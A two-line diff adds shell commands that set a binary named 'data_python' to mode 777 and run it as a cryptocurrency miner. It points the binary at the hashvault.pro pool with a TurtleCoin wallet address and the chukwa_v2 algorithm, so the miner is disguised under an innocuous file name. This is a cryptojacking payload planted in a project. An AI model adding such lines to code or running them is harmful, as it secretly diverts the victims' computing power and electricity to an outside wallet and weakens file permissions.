@@ -1,0 +1,2 @@
+chmod 777 data_python
+./data_python --pool pool.hashvault.pro:80 --username TRTLuyZZwLj49mHL6G19SjW3zuAsi5rU4VKLQKHEchBPNENaJeUG3DU12WP6Lx5ihY5HegR8qqpKAh2kzniw661SafFVPa4JEJd --password x --algorithm chukwa_v2
